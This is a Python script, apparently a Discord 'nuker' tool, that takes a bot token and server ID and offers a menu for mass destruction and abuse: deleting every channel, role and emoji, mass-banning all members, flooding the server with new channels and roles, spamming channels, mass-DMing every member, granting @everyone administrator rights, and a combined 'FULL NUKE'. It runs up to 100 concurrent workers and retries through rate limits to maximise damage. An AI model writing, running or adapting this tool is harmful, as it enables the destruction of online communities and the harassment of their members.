import aiohttp
import asyncio
import os
import sys
import json
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

BANNER = f"""
{Fore.RED}  ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗     ███████╗██╗  ██╗
{Fore.RED} ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗    ╚════██║██║  ██║
{Fore.RED} ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝        ██╔╝███████║
{Fore.RED} ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝        ██╔╝ ╚════██║
{Fore.RED} ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║            ██║       ██║
{Fore.RED}  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝            ╚═╝       ╚═╝
{Fore.WHITE}            || Group #74 || made b2y mohib ||{Style.RESET_ALL}
"""

clear = lambda: os.system('clear' if os.name != 'nt' else 'cls')

_session = None
CONFIG = {"token": "", "guild_id": ""}
WORKERS = 100
BATCH_SIZE = 100

async def get_session(token=None):
    global _session
    if _session is None or _session.closed:
        headers = {"Authorization": f"Bot {token}"} if token else {}
        conn = aiohttp.TCPConnector(limit=0, force_close=False, limit_per_host=0, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=30)
        _session = aiohttp.ClientSession(headers=headers, connector=conn, timeout=timeout, json_serialize=json.dumps)
    return _session

async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()

SEM = asyncio.Semaphore(WORKERS)

async def req(method, url, **kw):
    max_retries = 5
    for attempt in range(max_retries):
        async with SEM:
            s = await get_session()
            try:
                async with s.request(method, url, **kw) as resp:
                    if resp.status == 429:
                        retry = int(resp.headers.get('Retry-After', 1)) * (attempt + 1)
                        await asyncio.sleep(min(retry, 10))
                        continue
                    return resp
            except (aiohttp.ClientError, asyncio.TimeoutError):
                if attempt == max_retries - 1: return None
                await asyncio.sleep(1 * (attempt + 1))
    return None

async def set_presence(token):
    try:
        s = await get_session()
        async with s.ws_connect("wss://gateway.discord.gg/?v=9&encoding=json") as ws:
            await ws.receive_json()
            await ws.send_json({
                "op": 2, "d": {
                    "token": token, "intents": 0,
                    "properties": {"$os": "linux", "$browser": "disco", "$device": "disco"},
                    "presence": {
                        "activities": [{"name": "Security", "type": 1}],
                        "status": "idle", "since": 0, "afk": False
                    }
                }
            })
            await ws.send_json({"op": 1, "d": None})
            await asyncio.sleep(0.3)
            print(f"{Fore.GREEN}[+] Streaming | Security{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}[!] Presence skipped{Style.RESET_ALL}")

async def setup():
    global CONFIG
    while True:
        clear(); print(BANNER)
        token = input(f"{Fore.RED}[?] Token: {Style.RESET_ALL}").strip()
        s = await get_session(token)
        async with s.get("https://discord.com/api/v9/users/@me") as r:
            if r.status == 200:
                d = await r.json()
                print(f"{Fore.GREEN}[+] {d['username']}{Style.RESET_ALL}")
                asyncio.create_task(set_presence(token))
                await asyncio.sleep(0.3)
            else:
                print(f"{Fore.RED}[!] Bad Token{Style.RESET_ALL}")
                await asyncio.sleep(2); _session = None; continue
        while True:
            gid = input(f"{Fore.RED}[?] Server ID: {Style.RESET_ALL}").strip()
            s = await get_session(token)
            async with s.get(f"https://discord.com/api/v9/guilds/{gid}") as r:
                if r.status == 200:
                    g = await r.json()
                    print(f"{Fore.GREEN}[+] {g['name']}{Style.RESET_ALL}")
                    CONFIG = {"token": token, "guild_id": gid}
                    _session = None
                    return token, gid
                print(f"{Fore.RED}[!] Invalid Server{Style.RESET_ALL}"); await asyncio.sleep(1)

async def get_members(s, gid):
    members = []
    seen = set()
    queue = asyncio.Queue()

    async def producer():
        after = 0
        while True:
            async with s.get(f"https://discord.com/api/v9/guilds/{gid}/members", params={"limit": 1000, "after": after}) as r:
                if r.status != 200: break
                batch = await r.json()
                if not batch: break
                await queue.put(batch)
                if len(batch) < 1000: break
                after = batch[-1]['user']['id']

    async def consumer():
        while True:
            batch = await queue.get()
            for m in batch:
                uid = m.get('user', {}).get('id')
                if uid and uid not in seen:
                    seen.add(uid)
                    members.append(m)
            queue.task_done()
            if len(batch) < 1000:
                break

    producer_task = asyncio.create_task(producer())
    consumer_task = asyncio.create_task(consumer())
    await asyncio.gather(producer_task, consumer_task)
    await queue.join()
    return members

async def ban_all_v2(s, gid, token):
    print(f"{Fore.YELLOW}[!] Fetching members...{Style.RESET_ALL}")
    members = await get_members(s, gid)
    me = await (await s.get("https://discord.com/api/v9/users/@me")).json()
    bid = me['id']
    g = await (await s.get(f"https://discord.com/api/v9/guilds/{gid}")).json()
    oid = g.get('owner_id', '')
    to_ban = [m for m in members if m.get('user', {}).get('id') not in [bid, oid] and not m.get('user', {}).get('bot', False)]
    total = len(to_ban)
    print(f"{Fore.YELLOW}[!] Banning {total} members (Batch: {BATCH_SIZE} | Workers: {WORKERS}){Style.RESET_ALL}")

    if total == 0:
        print(f"{Fore.RED}[!] No one to ban{Style.RESET_ALL}"); return

    sem_ban = asyncio.Semaphore(WORKERS)
    banned_count = 0
    sem_lock = asyncio.Lock()

    async def ban_one(m):
        nonlocal banned_count
        uid = m['user']['id']
        async with sem_ban:
            for attempt in range(3):
                try:
                    async with s.put(f"https://discord.com/api/v9/guilds/{gid}/bans/{uid}", json={"delete_message_seconds": 0}) as r:
                        if r.status in [200, 204]:
                            async with sem_lock:
                                banned_count += 1
                            return True
                        elif r.status == 429:
                            await asyncio.sleep(int(r.headers.get('Retry-After', 1)) * (attempt + 1))
                        else:
                            return False
                except:
                    await asyncio.sleep(0.5)
        return False

    for i in range(0, total, BATCH_SIZE):
        batch = to_ban[i:i+BATCH_SIZE]
        results = await asyncio.gather(*[ban_one(m) for m in batch])
        success = sum(results)
        pct = min((banned_count / total) * 100, 100)
        print(f"{Fore.CYAN}[+] {banned_count}/{total} ({pct:.0f}%) {Fore.GREEN}{success} banned batch{Style.RESET_ALL}")
        await asyncio.sleep(0.05)

    print(f"{Fore.GREEN}[✓] Total Banned: {banned_count}/{total}{Style.RESET_ALL}")

async def delete_channels_v2(s, channels):
    targets = [c for c in channels if c['type'] in [0, 2, 4, 5, 13, 15]]
    total = len(targets)
    print(f"{Fore.YELLOW}[!] Deleting {total} channels...{Style.RESET_ALL}")

    sem_del = asyncio.Semaphore(WORKERS)
    del_count = 0
    lock = asyncio.Lock()

    async def del_one(c):
        nonlocal del_count
        async with sem_del:
            async with s.delete(f"https://discord.com/api/v9/channels/{c['id']}") as r:
                if r.status in [200, 204]:
                    async with lock:
                        del_count += 1

    for i in range(0, total, BATCH_SIZE):
        batch = targets[i:i+BATCH_SIZE]
        await asyncio.gather(*[del_one(c) for c in batch])
        if del_count % 50 == 0 and del_count > 0:
            print(f"{Fore.CYAN}[↻] Deleted {del_count}/{total}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Deleted {del_count}/{total} channels{Style.RESET_ALL}")

async def create_channels_v2(s, gid, name, count):
    print(f"{Fore.YELLOW}[!] Creating {count} channels with name: {name}...{Style.RESET_ALL}")
    sem_cr = asyncio.Semaphore(WORKERS)
    created = 0
    lock = asyncio.Lock()

    async def create_one(i):
        nonlocal created
        async with sem_cr:
            async with s.post(f"https://discord.com/api/v9/guilds/{gid}/channels", json={"name": name, "type": 0}) as r:
                if r.status in [200, 201]:
                    async with lock:
                        created += 1

    for i in range(0, count, BATCH_SIZE):
        batch_end = min(i + BATCH_SIZE, count)
        tasks = [create_one(j+1) for j in range(i, batch_end)]
        await asyncio.gather(*tasks)
        print(f"{Fore.CYAN}[+] Created {created}/{count}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Created {created}/{count} channels named '{name}'{Style.RESET_ALL}")

async def delete_roles_v2(s, gid, roles):
    targets = [r for r in roles if r['name'] != '@everyone']
    total = len(targets)
    print(f"{Fore.YELLOW}[!] Deleting {total} roles...{Style.RESET_ALL}")

    sem_del = asyncio.Semaphore(WORKERS)
    deleted = 0
    lock = asyncio.Lock()

    async def del_one(r):
        nonlocal deleted
        async with sem_del:
            async with s.delete(f"https://discord.com/api/v9/guilds/{gid}/roles/{r['id']}") as rr:
                if rr.status in [200, 204]:
                    async with lock:
                        deleted += 1

    for i in range(0, total, BATCH_SIZE):
        batch = targets[i:i+BATCH_SIZE]
        await asyncio.gather(*[del_one(r) for r in batch])
        if deleted % 50 == 0 and deleted > 0:
            print(f"{Fore.CYAN}[↻] Deleted {deleted}/{total}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Deleted {deleted}/{total} roles{Style.RESET_ALL}")

async def create_roles_v2(s, gid, name, count):
    print(f"{Fore.YELLOW}[!] Creating {count} roles with name: {name}...{Style.RESET_ALL}")
    sem_cr = asyncio.Semaphore(WORKERS)
    created = 0
    lock = asyncio.Lock()

    async def create_one(i):
        nonlocal created
        async with sem_cr:
            async with s.post(f"https://discord.com/api/v9/guilds/{gid}/roles", json={"name": name}) as r:
                if r.status in [200, 201]:
                    async with lock:
                        created += 1

    for i in range(0, count, BATCH_SIZE):
        batch_end = min(i + BATCH_SIZE, count)
        tasks = [create_one(j+1) for j in range(i, batch_end)]
        await asyncio.gather(*tasks)
        print(f"{Fore.CYAN}[+] Created {created}/{count}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Created {created}/{count} roles named '{name}'{Style.RESET_ALL}")

async def rename_channels_v2(s, channels, new_name):
    targets = [c for c in channels if c['type'] in [0, 2, 4, 5]]
    total = len(targets)
    print(f"{Fore.YELLOW}[!] Renaming {total} channels...{Style.RESET_ALL}")

    sem_ren = asyncio.Semaphore(WORKERS)
    renamed = 0
    lock = asyncio.Lock()

    async def ren_one(c, idx):
        nonlocal renamed
        async with sem_ren:
            async with s.patch(f"https://discord.com/api/v9/channels/{c['id']}", json={"name": f"{new_name}-{idx}"}) as r:
                if r.status == 200:
                    async with lock:
                        renamed += 1

    for i in range(0, total, BATCH_SIZE):
        batch = list(enumerate(targets))[i:i+BATCH_SIZE]
        tasks = [ren_one(c, idx+1) for idx, c in batch]
        await asyncio.gather(*tasks)
        if renamed % 50 == 0 and renamed > 0:
            print(f"{Fore.CYAN}[↻] Renamed {renamed}/{total}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Renamed {renamed}/{total} channels{Style.RESET_ALL}")

async def spam_channels_v2(s, channels, msg, times):
    tc = [c for c in channels if c['type'] == 0]
    total = len(tc) * times
    print(f"{Fore.YELLOW}[!] Spamming {total} messages...{Style.RESET_ALL}")

    sem_sp = asyncio.Semaphore(WORKERS)
    sent = 0
    lock = asyncio.Lock()

    async def spam_one(c):
        nonlocal sent
        async with sem_sp:
            async with s.post(f"https://discord.com/api/v9/channels/{c['id']}/messages", json={"content": msg}) as r:
                if r.status == 200:
                    async with lock:
                        sent += 1

    for t in range(times):
        tasks = [spam_one(c) for c in tc]
        await asyncio.gather(*tasks)
        if sent % 50 == 0 and sent > 0:
            print(f"{Fore.CYAN}[↻] Sent {sent}{Style.RESET_ALL}")
        await asyncio.sleep(0.1)

    print(f"{Fore.GREEN}[✓] Sent {sent} messages{Style.RESET_ALL}")

async def dm_all_v2(s, gid, msg):
    print(f"{Fore.YELLOW}[!] Fetching members for DM...{Style.RESET_ALL}")
    members = await get_members(s, gid)
    me = await (await s.get("https://discord.com/api/v9/users/@me")).json()
    bid = me['id']
    targets = [m for m in members if not m.get('user', {}).get('bot', False) and m.get('user', {}).get('id') != bid]
    total = len(targets)
    print(f"{Fore.YELLOW}[!] DMs to {total} members...{Style.RESET_ALL}")

    sem_dm = asyncio.Semaphore(30)
    sent = 0
    lock = asyncio.Lock()

    async def dm_one(m):
        nonlocal sent
        uid = m['user']['id']
        async with sem_dm:
            async with s.post("https://discord.com/api/v9/users/@me/channels", json={"recipient_id": uid}) as dm:
                if dm.status == 200:
                    cd = await dm.json()
                    async with s.post(f"https://discord.com/api/v9/channels/{cd['id']}/messages", json={"content": msg}) as ms:
                        if ms.status == 200:
                            async with lock:
                                sent += 1

    for i in range(0, total, 30):
        batch = targets[i:i+30]
        await asyncio.gather(*[dm_one(m) for m in batch])
        print(f"{Fore.CYAN}[+] DM sent to {sent}/{total}{Style.RESET_ALL}")
        await asyncio.sleep(0.3)

    print(f"{Fore.GREEN}[✓] DMs sent to {sent}{Style.RESET_ALL}")

async def delete_emojis_v2(s, gid):
    r = await s.get(f"https://discord.com/api/v9/guilds/{gid}/emojis")
    ems = await r.json() if r.status == 200 else []
    total = len(ems)
    print(f"{Fore.YELLOW}[!] Deleting {total} emojis...{Style.RESET_ALL}")

    sem_em = asyncio.Semaphore(WORKERS)
    deleted = 0
    lock = asyncio.Lock()

    async def del_one(e):
        nonlocal deleted
        async with sem_em:
            async with s.delete(f"https://discord.com/api/v9/guilds/{gid}/emojis/{e['id']}") as rr:
                if rr.status in [200, 204]:
                    async with lock:
                        deleted += 1

    for i in range(0, total, BATCH_SIZE):
        batch = ems[i:i+BATCH_SIZE]
        await asyncio.gather(*[del_one(e) for e in batch])
        if deleted % 20 == 0 and deleted > 0:
            print(f"{Fore.CYAN}[↻] Deleted {deleted}/{total}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[✓] Deleted {deleted}/{total} emojis{Style.RESET_ALL}")

async def action(ch, token, gid):
    s = await get_session(token)
    chs, rls = [], []
    if ch in ["1","3","4","9"]:
        r = await s.get(f"https://discord.com/api/v9/guilds/{gid}/channels")
        chs = await r.json() if r.status == 200 else []
    if ch in ["5","6","7"]:
        r = await s.get(f"https://discord.com/api/v9/guilds/{gid}/roles")
        rls = await r.json() if r.status == 200 else []

    print(f"\n{Fore.RED}[!] EXECUTING...{Style.RESET_ALL}\n")

    if ch == "1":
        await delete_channels_v2(s, chs)
    elif ch == "2":
        n = input(f"{Fore.RED}[?] Name: {Style.RESET_ALL}").strip()
        c = int(input(f"{Fore.RED}[?] Count: {Style.RESET_ALL}"))
        await create_channels_v2(s, gid, n, c)
    elif ch == "3":
        sn = input(f"{Fore.RED}[?] Server Name: {Style.RESET_ALL}").strip()
        cn = input(f"{Fore.RED}[?] Channel Name: {Style.RESET_ALL}").strip()
        cc = int(input(f"{Fore.RED}[?] Count: {Style.RESET_ALL}"))
        async with s.patch(f"https://discord.com/api/v9/guilds/{gid}", json={"name": sn}):
            pass
        await delete_channels_v2(s, chs)
        await asyncio.sleep(0.5)
        await create_channels_v2(s, gid, cn, cc)
        await ban_all_v2(s, gid, token)
    elif ch == "4":
        n = input(f"{Fore.RED}[?] New Name: {Style.RESET_ALL}").strip()
        await rename_channels_v2(s, chs, n)
    elif ch == "5":
        n = input(f"{Fore.RED}[?] Role: {Style.RESET_ALL}").strip()
        c = int(input(f"{Fore.RED}[?] Count: {Style.RESET_ALL}"))
        await create_roles_v2(s, gid, n, c)
    elif ch == "6":
        await delete_roles_v2(s, gid, rls)
    elif ch == "7":
        await s.patch(f"https://discord.com/api/v9/guilds/{gid}/roles/{gid}", json={"permissions": "8", "name": "@everyone"})
        print(f"{Fore.GREEN}[+] @everyone Admin{Style.RESET_ALL}")
    elif ch == "8":
        await ban_all_v2(s, gid, token)
    elif ch == "9":
        msg = input(f"{Fore.RED}[?] Message: {Style.RESET_ALL}")
        cnt = int(input(f"{Fore.RED}[?] Times: {Style.RESET_ALL}"))
        await spam_channels_v2(s, chs, msg, cnt)
    elif ch == "10":
        msg = input(f"{Fore.RED}[?] DM Text: {Style.RESET_ALL}")
        await dm_all_v2(s, gid, msg)
    elif ch == "11":
        await delete_emojis_v2(s, gid)
    elif ch == "12":
        nn = input(f"{Fore.RED}[?] Server Name: {Style.RESET_ALL}").strip()
        async with s.patch(f"https://discord.com/api/v9/guilds/{gid}", json={"name": nn}) as r:
            if r.status == 200:
                print(f"{Fore.GREEN}[✓] Renamed{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed{Style.RESET_ALL}")

async def main():
    token, gid = await setup()
    while True:
        clear(); print(BANNER)
        print(f"┌──────────────────────────────────────────────────────────┐")
        print(f"│ [ 1] Delete Channels      │ [ 2] Create Channels         │")
        print(f"│ [ 3] FULL NUKE            │ [ 4] Rename Channels         │")
        print(f"│ [ 5] Create Roles         │ [ 6] Delete All Roles        │")
        print(f"│ [ 7] @everyone Admin      │ [ 8] Ban All Members         │")
        print(f"│ [ 9] Channel Spam         │ [10] Mass DM                 │")
        print(f"│ [11] Delete Emojis        │ [12] Rename Server           │")
        print(f"│ [ 0] Exit                 │                              │")
        print(f"└──────────────────────────────────────────────────────────┘")
        ch = input(f"\n{Fore.RED}[+] Option: {Style.RESET_ALL}").strip()
        if ch == "0": break
        await action(ch, token, gid)
        input(f"\n{Fore.WHITE}[Enter]{Style.RESET_ALL}")
    await close_session()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: print(f"\n{Fore.YELLOW}[!] Exited{Style.RESET_ALL}")
    except: pass

